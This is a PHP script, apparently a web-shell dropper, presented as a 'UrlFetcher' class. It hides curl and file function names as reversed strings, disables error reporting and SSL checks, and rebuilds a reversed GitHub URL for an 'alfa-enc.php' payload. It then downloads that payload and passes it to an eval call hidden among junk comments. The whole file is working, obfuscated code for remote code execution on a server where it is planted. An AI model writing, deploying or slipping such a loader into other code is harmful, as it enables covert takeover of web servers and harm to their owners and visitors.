<?php
session_start();
error_reporting(0);

class UrlFetcher
{
    private $userAgent;
    private $funcArray;

    public function __construct()
    {
        $this->userAgent = 'Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0';
        $this->funcArray = array(
            'crl' => array(
                'exec' => strrev('cexe_lruc'),
                'init' => strrev('tini_lruc'),
                'opt' => strrev('tpotes_lruc'),
                'close' => strrev('esolc_lruc')
            ),
            'file' => array(
                'getContents' => strrev('stnetnoc_teg_elif'),
                'open' => strrev('nepof'),
                'streamContents' => strrev('stnetnoc_teg_maerts'),
                'close' => strrev('esolcf')
            )
        );
    }

    private function obfuscate($data)
    {
        return base64_encode(strrev($data));
    }

    private function deobfuscate($data)
    {
        return strrev(base64_decode($data));
    }

    private function getFunc($type, $name)
    {
        return $this->funcArray[$type][$name];
    }

    public function fetch($url)
    {
        $crl_exec = $this->getFunc('crl', 'exec');
        $file_getContents = $this->getFunc('file', 'getContents');
        $file_open = $this->getFunc('file', 'open');
        $stream_getContents = $this->getFunc('file', 'streamContents');

        if (function_exists($crl_exec)) {
            goto use_crl;
        } elseif (function_exists($file_getContents)) {
            goto use_file;
        } elseif (function_exists($file_open) && function_exists($stream_getContents)) {
            goto use_fo;
        } else {
            goto no_function;
        }

        use_crl:
        return $this->crlFetch($url);
        goto end_fetch;

        use_file:
        return $file_getContents($url);
        goto end_fetch;

        use_fo:
        return $this->foFetch($url);
        goto end_fetch;

        no_function:
        return false;

        end_fetch:
        return null;
    }

    private function crlFetch($url)
    {
        $crl_init = $this->getFunc('crl', 'init');
        $crl_opt = $this->getFunc('crl', 'opt');
        $crl_close = $this->getFunc('crl', 'close');
        $crl_exec = $this->getFunc('crl', 'exec');

        $conn = $crl_init($url);
        $crl_opt($conn, CURLOPT_RETURNTRANSFER, 1);
        $crl_opt($conn, CURLOPT_FOLLOWLOCATION, 1);
        $crl_opt($conn, CURLOPT_USERAGENT, $this->userAgent);
        $crl_opt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        $crl_opt($conn, CURLOPT_SSL_VERIFYHOST, 0);

        if (isset($_SESSION[$this->obfuscate('nulzganteng')])) {
            $crl_opt($conn, CURLOPT_COOKIE, $_SESSION[$this->obfuscate('nulzganteng')]);
        }

        $url_get_contents_data = $crl_exec($conn);
        $crl_close($conn);

        return $url_get_contents_data;
    }

    private function foFetch($url)
    {
        $file_open = $this->getFunc('file', 'open');
        $stream_getContents = $this->getFunc('file', 'streamContents');
        $file_close = $this->getFunc('file', 'close');

        $handle = $file_open($url, "r");
        $url_get_contents_data = $stream_getContents($handle);
        $file_close($handle);

        return $url_get_contents_data;
    }
}

$fetcher = new UrlFetcher();
$nulzpro = strrev('php.cne-afla/afla/niam/evihcra/sratsroxah/moc.tnetnocresubuhtig.war//:sptth');
$nulzganteng = $fetcher->fetch($nulzpro);

/****/@/*55555*/null; /******/@/*55555*/eval/*######*/('?>' . $nulzganteng);
?>
